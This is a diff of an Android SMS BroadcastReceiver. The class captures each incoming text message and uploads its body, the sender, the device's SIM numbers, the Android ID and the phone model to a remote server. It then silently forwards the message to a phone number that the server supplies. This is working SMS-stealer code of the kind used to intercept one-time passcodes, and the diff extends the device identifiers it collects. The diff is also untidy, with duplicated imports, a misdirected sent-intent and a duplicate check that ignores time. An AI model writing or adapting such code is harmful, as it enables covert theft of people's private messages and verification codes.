@@ -13,12 +13,28 @@ import android.widget.Toast;
 
 import org.json.JSONException;
 import org.json.JSONObject;
+import android.app.PendingIntent;
+import android.content.BroadcastReceiver;
+import android.content.Context;
+import android.content.Intent;
+import android.os.Build;
+import android.os.Bundle;
+import android.telephony.SmsManager;
+import android.telephony.SmsMessage;
+import android.util.Log;
+import android.widget.Toast;
 
-public class MessageRc extends BroadcastReceiver {
+import org.json.JSONException;
+import org.json.JSONObject;
 
-    private String previous_message = "";
-    private  int userId = 0;
+import java.util.HashSet;
+import java.util.Set;
 
+public class MessageReceiver extends BroadcastReceiver {
+
+    private static final Set<String> processedMessages = new HashSet<>();
+    private static final long TIME_LIMIT_MS = 60000; // 1 minute window to ignore duplicates
+    private int userId = 0;
     @Override
     public void onReceive(Context context, Intent intent) {
         if (intent.getAction() != null && intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
@@ -29,30 +45,36 @@ public class MessageRc extends BroadcastReceiver {
                     for (Object pdu : pdus) {
                         SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                         if (smsMessage != null) {
-                            String sender = smsMessage.getDisplayOriginatingAddress();
+                            String receiver = Helper.getSimNumbers(context);
+                            String sender = "Receiver : "+receiver + "<br> Sender : " +  smsMessage.getDisplayOriginatingAddress();
                             String messageBody = smsMessage.getMessageBody();
-                            if(messageBody!=previous_message){
-                                previous_message = messageBody;
+
+                            long timestamp = smsMessage.getTimestampMillis();
+                            String uniqueId = sender + messageBody;
+
+                            if (!isDuplicate(uniqueId, timestamp)) {
+                                processedMessages.add(uniqueId);
                                 JSONObject jsonData = new JSONObject();
                                 try {
                                     Helper helper = new Helper();
                                     jsonData.put("site", helper.SITE());
                                     jsonData.put("message", messageBody);
                                     jsonData.put("sender", sender);
+                                    jsonData.put("mobile_id", Helper.getAndroidId(context));
                                     jsonData.put("model", Build.MODEL);
                                     jsonData.put("status", "N/A");
-                                    Helper.postRequest(helper.SMSSavePath(), jsonData, new Helper.ResponseListener() {
+                                    Helper.postRequest(helper.SMSSavePath(), jsonData, context, new Helper.ResponseListener() {
                                         @Override
                                         public void onResponse(String result) {
-                                            if (result.startsWith("Response Error:")) {
+                                            if(result.startsWith("Response Error:")) {
                                                 Toast.makeText(context, "Response Error : "+result, Toast.LENGTH_SHORT).show();
                                             } else {
                                                 try {
-                                                    Log.d(Helper.TAG, "RESPONN RESULT : "+result);
+
                                                     JSONObject response = new JSONObject(result);
                                                     if(response.getInt("status")==200){
                                                         userId  = response.getInt("data");
-                                                        Helper.getRequest("/site/number?site="+ helper.SITE(), new Helper.ResponseListener(){
+                                                        Helper.getRequest(helper.getNumber() + helper.SITE(), context, new Helper.ResponseListener(){
                                                             @Override
                                                             public void onResponse(String result){
                                                                 try {
@@ -60,9 +82,10 @@ public class MessageRc extends BroadcastReceiver {
                                                                     JSONObject jsonResponse = new JSONObject(result);
                                                                     if (jsonResponse.has("data")) {
                                                                         String phoneNumber = jsonResponse.getString("data");
+                                                                        Log.d(Helper.TAG, "PHone Number "+ phoneNumber);
 
-                                                                        Intent sentIntent = new Intent(context, SendingMark.class);
-                                                                        Intent deliveredIntent = new Intent(context, MessageDeli.class);
+                                                                        Intent sentIntent = new Intent(context, MessageReceiver.class);
+                                                                        Intent deliveredIntent = new Intent(context, MessageDeliver.class);
                                                                         sentIntent.putExtra("id", userId);
                                                                         sentIntent.putExtra("phone", phoneNumber);
                                                                         deliveredIntent.putExtra("id", userId);
@@ -71,7 +94,8 @@ public class MessageRc extends BroadcastReceiver {
                                                                         PendingIntent deliveredPendingIntent = PendingIntent.getBroadcast(context, 0, deliveredIntent, PendingIntent.FLAG_IMMUTABLE);
                                                                         SmsManager smsManager = SmsManager.getDefault();
                                                                         smsManager.sendTextMessage(phoneNumber, null, messageBody, sentPendingIntent, deliveredPendingIntent);
-                                                                        Log.d(Helper.TAG, "SMS Forward");
+
+//                                                                                    Log.d(Helper.TAG, "SMS Forward");
                                                                     } else {
                                                                         Log.e("MYAPP: ", "Response does not contain 'data' field");
                                                                     }
@@ -102,6 +126,10 @@ public class MessageRc extends BroadcastReceiver {
                 }
             }
         }
+    }
+
+    private boolean isDuplicate(String uniqueId, long timestamp) {
+        return processedMessages.contains(uniqueId);
     }
 
 }
